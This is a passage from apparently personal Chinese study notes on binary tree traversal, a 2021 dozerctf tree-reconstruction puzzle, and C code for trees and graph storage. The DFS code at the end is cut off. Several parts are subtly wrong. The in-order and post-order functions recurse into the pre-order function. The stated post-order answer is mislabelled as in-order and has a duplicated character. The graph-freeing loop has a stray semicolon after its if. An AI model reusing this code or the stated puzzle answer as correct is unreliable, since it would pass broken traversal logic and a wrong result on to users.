src="https://i.loli.net/2021/08/09/o9I23qpFhd84xmB.png"></p><p>2.中序遍历</p><p>规则是若树为空，则空操作返回，否则从根结点开始（注意并不是先访问根结点)，中序遍历根结点的左子树，然后是访问根结点，最后中序遍历右子树。这种特点就是对于每个结点，其左子结点优先级比该结点高，改结点的优先级又比其右结点高。<br><img src="https://i.loli.net/2021/08/09/gma4vNA9JiZc3BG.png"></p><p>3.后序遍历</p><p>规则是若树为空，则空操作返回，否则从左到右先叶子后结点的方式遍历访问左右子树，最后是访问根结点。这种特点是叶子优先级最高，左叶又比右叶高。<br><img src="https://i.loli.net/2021/08/09/PueLQqmAZFki9If.png"></p><p>而且关于二叉树的遍历还有个性质</p><ul><li>已知前序遍历序列和中序遍历序列,可以唯一确定一棵二叉树。</li><li>已知后序遍历序列和中序遍历序列,可以唯一确定一棵二叉树。</li></ul><p>这种性质，还在2021 dozerctf的题中出现过，该题给了前序和中序，flag就是后序。我们可以来看看这道题。</p><pre><code>前序遍历顺序：T0-LA1526Eta_lcienrpsu中序遍历顺序：-01256AELT_aceilnprstu</code></pre><p>现在我们需要知道其后序遍历，所以我们要先还原树结构，根据不同遍历的特点，我们可以还原树结构如下。<br><img src="https://i.loli.net/2021/08/09/njkTOUXSB6RvGPa.png"><br>然后得到后序遍历顺序</p><pre><code>中序遍历顺序：-2651EAL0-eicpsrnlautT</code></pre><h4 id="二叉树的建立"><a href="#二叉树的建立" class="headerlink" title="二叉树的建立"></a>二叉树的建立</h4><p>给个二叉树链式结构，建立和遍历是差不多的，只是把输出，改为了赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> str[] = <span class="string">&quot;ABD###C##&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>  /* 结点结构 */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> data;<span class="comment">/* 结点数据 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span> <span class="comment">/* 左右孩子指针 */</span></span><br><span class="line">&#125;BiTNode, * BiTree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initBiTree</span><span class="params">(BiTree *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以看到，这里采用了二级指针，这样才可以真正给树开枝叶。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"></span><br><span class="line">ch = str[index++];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">*T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">(*T) = (BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">(*T)-&gt;data = ch;</span><br><span class="line"><span class="keyword">if</span> (!*T)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">CreateBiTree(&amp;(*T)-&gt;lchild);</span><br><span class="line">CreateBiTree(&amp;(*T)-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, T-&gt;data);</span><br><span class="line">PreOrderTraverse(T-&gt;lchild);</span><br><span class="line">PreOrderTraverse(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PreOrderTraverse(T-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, T-&gt;data);</span><br><span class="line">PreOrderTraverse(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PreOrderTraverse(T-&gt;lchild);</span><br><span class="line">PreOrderTraverse(T-&gt;rchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, T-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteBiTree</span><span class="params">(BiTree *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (*T)</span><br><span class="line">&#123;</span><br><span class="line">deleteBiTree(&amp;(*T)-&gt;lchild);</span><br><span class="line">deleteBiTree(&amp;(*T)-&gt;rchild);</span><br><span class="line"><span class="built_in">free</span>(*T);</span><br><span class="line">*T = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BiTree T;</span><br><span class="line">initBiTree(&amp;T);</span><br><span class="line">CreateBiTree(&amp;T);</span><br><span class="line">PreOrderTraverse(T);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">InOrderTraverse(T);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">PostOrderTraverse(T);</span><br><span class="line">deleteBiTree(&amp;T);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><h4 id="图的相关术语"><a href="#图的相关术语" class="headerlink" title="图的相关术语"></a>图的相关术语</h4><p>图按照有无方向分为<strong>无向图</strong>和<strong>有向图</strong>。无向图由顶点和边构成，有向图由顶点和弧构成。弧有弧尾和弧头之分。</p><p>图按照边或弧的多少分<strong>稀疏图</strong>和<strong>稠密图</strong>。如果任意两个顶点之间都存在边叫完全图，有向的叫有向完全图。若无重复的边或顶点到自身的边则叫简单图。</p><p>图中顶点之间有邻接点、依附的概念。无向图顶点的边数叫做<strong>度</strong>，有向图顶点分为<strong>入度</strong>和<strong>出度</strong>。</p><p>图上的边或弧上带<strong>权</strong>则称为<strong>网</strong>。</p><p>图中顶点间存在路径，两顶点存在路径则说明是连通的，如果路径最终回到起始点则称为环，当中不重复叫简单路径。若任意两顶点都是连通的，则图就是连通图，有向则称强连通图。图中有子图，若子图极大连通则就是连通分量，有向的则称强连通分量。</p><p>无向图中连通且n个顶点n-1条边叫<strong>生成树</strong>。有向图中一顶点入度为0其余顶点入度为1的叫有向树。一个有向图由若干棵有向树构成生成森林。</p><h4 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h4><p>书上有5中方法，现在暂时记录两种。</p><p>1.邻接矩阵</p><p>对于无向图<br><img src="https://i.loli.net/2021/08/11/NmvTJzcRS49O6fQ.png"><br>对于有向图，而且有权<br><img src="https://i.loli.net/2021/08/11/l9CHcaR5fk8DeJG.png"><br>下面来写一写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVEX 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> vexs[MAXVEX]; <span class="comment">/* 顶点表 */</span></span><br><span class="line"><span class="keyword">int</span> arc[MAXVEX][MAXVEX];<span class="comment">/* 邻接矩阵，可看作边表 */</span></span><br><span class="line"><span class="keyword">int</span> numNodes, numEdges; <span class="comment">/* 图中当前的顶点数和边数  */</span></span><br><span class="line">&#125;MGraph;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateMGraph</span><span class="params">(MGraph* G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,m,W;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入顶点数和边数:\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%d,%d&quot;</span>, &amp;G-&gt;numNodes, &amp;G-&gt;numEdges);</span><br><span class="line">getchar();<span class="comment">//用来清除回车键</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请依次输入顶点名称:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numNodes; i++)</span><br><span class="line">&#123;</span><br><span class="line">scanf_s(<span class="string">&quot;%c&quot;</span>, &amp;G-&gt;vexs[i],<span class="number">1</span>);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numNodes; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G-&gt;numNodes; j++)</span><br><span class="line">G-&gt;arc[i][j] = <span class="number">65535</span>;</span><br><span class="line"><span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; G-&gt;numEdges; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入边(vi,vj)上的下标i，下标j和权w:\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%d,%d,%d&quot;</span>, &amp;i, &amp;j, &amp;W);</span><br><span class="line">G-&gt;arc[i][j] = W;</span><br><span class="line"><span class="comment">//G-&gt;arc[j][i] = G-&gt;arc[i][j];无向加这句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PutMGraph</span><span class="params">(MGraph G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.numNodes; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.numNodes; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%6d&quot;</span>, G.arc[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MGraph G;</span><br><span class="line">CreateMGraph(&amp;G);</span><br><span class="line">PutMGraph(G);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.邻接表</p><p>上面的邻接矩阵在面对顶点多，边少的时候就会造成空间的浪费。邻接表就可以解决这一问题。</p><p>对于无向图<br><img src="https://i.loli.net/2021/08/11/YMghRFHZV2GnpXN.png"><br>对于有向图，且有权<br><img src="https://i.loli.net/2021/08/11/TEIqZrSDOFHdKiv.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVEX 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> /* 边表结点  */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> adjvex;    <span class="comment">/* 邻接点域,存储该顶点对应的下标 */</span></span><br><span class="line"><span class="keyword">int</span> info;<span class="comment">/* 用于存储权值,对于非网图可以不需要 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span>* <span class="title">next</span>;</span> <span class="comment">/* 链域,指向下一个邻接点 */</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VertexNode</span> /* 顶点表结点 */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> data; <span class="comment">/* 顶点域,存储顶点信息 */</span></span><br><span class="line">EdgeNode* firstedge;<span class="comment">/* 边表头指针 */</span></span><br><span class="line"><span class="comment">//EdgeNode* secondedge;/* 入度指针 */</span></span><br><span class="line">&#125;VertexNode, AdjList[MAXVEX];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">AdjList adjList;</span><br><span class="line"><span class="keyword">int</span> numNodes, numEdges; <span class="comment">/* 图中当前顶点数和边数 */</span></span><br><span class="line">&#125;GraphAdjList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateALGraph</span><span class="params">(GraphAdjList* G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, m, W;</span><br><span class="line">EdgeNode *p,*q;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入顶点数和边数:\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%d,%d&quot;</span>, &amp;G-&gt;numNodes, &amp;G-&gt;numEdges);</span><br><span class="line">getchar();<span class="comment">//用来清除回车键</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请依次输入顶点名称:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G-&gt;numNodes; i++)</span><br><span class="line">&#123;</span><br><span class="line">scanf_s(<span class="string">&quot;%c&quot;</span>, &amp;G-&gt;adjList[i].data, <span class="number">1</span>);</span><br><span class="line">getchar();</span><br><span class="line">G-&gt;adjList[i].firstedge = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; G-&gt;numEdges; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入边(vi,vj)上的下标i，下标j和权w:\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%d,%d,%d&quot;</span>, &amp;i, &amp;j, &amp;W);</span><br><span class="line"><span class="comment">//对于有向，且只有出度，若要有入度，在结构体加一个入度指针。</span></span><br><span class="line">p = (EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">p-&gt;adjvex = j;</span><br><span class="line">p-&gt;info = W;</span><br><span class="line">p-&gt;next = G-&gt;adjList[i].firstedge;</span><br><span class="line">G-&gt;adjList[i].firstedge = p;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对于无向图</span></span><br><span class="line"><span class="comment">//q = (EdgeNode*)malloc(sizeof(EdgeNode));</span></span><br><span class="line"><span class="comment">//q-&gt;adjvex = i;</span></span><br><span class="line"><span class="comment">//q-&gt;info = W;</span></span><br><span class="line"><span class="comment">//q-&gt;next = G-&gt;adjList[j].firstedge;</span></span><br><span class="line"><span class="comment">//G-&gt;adjList[j].firstedge = q;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeALGraph</span><span class="params">(GraphAdjList G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.numNodes; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (G.adjList[i].firstedge != <span class="literal">NULL</span>);</span><br><span class="line">&#123;</span><br><span class="line">EdgeNode *p,*q;</span><br><span class="line">p = G.adjList[i].firstedge;</span><br><span class="line"><span class="keyword">while</span> (p)</span><br><span class="line">&#123;</span><br><span class="line">q = p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p = q;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GraphAdjList G;</span><br><span class="line">CreateALGraph(&amp;G);</span><br><span class="line">freeALGraph(G);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="遍历图"><a href="#遍历图" class="headerlink" title="遍历图"></a>遍历图</h4><p>1.深度优先遍历。</p><p>就是一条路走到黑，发现不行就回走，找到可走的路径，然后走到底，如果不行就又回走，直到满足check条件。</p><p>下面的例子为了方便，就直接将书中例子图复制过来了，主要是dfs搜索。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;io.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;math.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;<span class="comment">/* Status是函数的类型,其值是函数结果状态代码，如OK等 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Boolean; <span class="comment">/* Boolean是布尔类型,其值是TRUE或FALSE */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> VertexType; <span class="comment">/* 顶点类型应由用户定义 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> EdgeType; <span class="comment">/* 边上的权值类型应由用户定义 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 9 <span class="comment">/* 存储空间初始分配量 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXEDGE 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVEX 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INFINITY 65535</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">VertexType 